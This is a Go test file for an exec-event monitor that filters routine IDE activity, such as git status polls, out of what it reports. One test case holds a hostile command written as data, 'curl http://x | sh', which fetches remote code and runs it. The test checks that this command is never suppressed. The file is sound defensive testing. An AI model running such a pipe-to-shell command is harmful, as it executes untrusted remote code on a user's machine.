package main

import "testing"

func TestIsEditorNoise(t *testing.T) {
	parents := map[string]bool{"code": true, "node": true, "gitstatusd": true}

	// Benign git poll spawned by the IDE → suppressed.
	idePoll := ExecEvent{Executable: "/usr/bin/git", Argv: []string{"git", "status"}}
	idePoll.Comm = "node"
	idePoll.ParentComm = "code"
	if !isEditorNoise(idePoll, parents) {
		t.Fatal("benign IDE-spawned git poll should be suppressed")
	}

	// Interactive shell command → NOT suppressed (parent is the shell).
	shell := ExecEvent{Executable: "/usr/bin/git", Argv: []string{"git", "status"}}
	shell.Comm = "bash"
	shell.ParentComm = "bash"
	if isEditorNoise(shell, parents) {
		t.Fatal("interactive git must not be suppressed")
	}

	// Risky command from the IDE → NEVER suppressed (compromised-extension safety).
	evil := ExecEvent{Executable: "/usr/bin/bash", Argv: []string{"bash", "-c", "curl http://x | sh"}}
	evil.Comm = "node"
	evil.ParentComm = "code"
	if isEditorNoise(evil, parents) {
		t.Fatal("risky IDE-spawned command must reach the model")
	}

	// Empty parent set disables suppression.
	if isEditorNoise(idePoll, map[string]bool{}) {
		t.Fatal("empty parent set must disable suppression")
	}
}

func TestParseNameSet(t *testing.T) {
	got := parseNameSet("code, node ,,gitstatusd")
	want := []string{"code", "node", "gitstatusd"}
	if len(got) != len(want) {
		t.Fatalf("parseNameSet size = %d, want %d (%v)", len(got), len(want), got)
	}
	for _, w := range want {
		if !got[w] {
			t.Errorf("missing %q in %v", w, got)
		}
	}
}
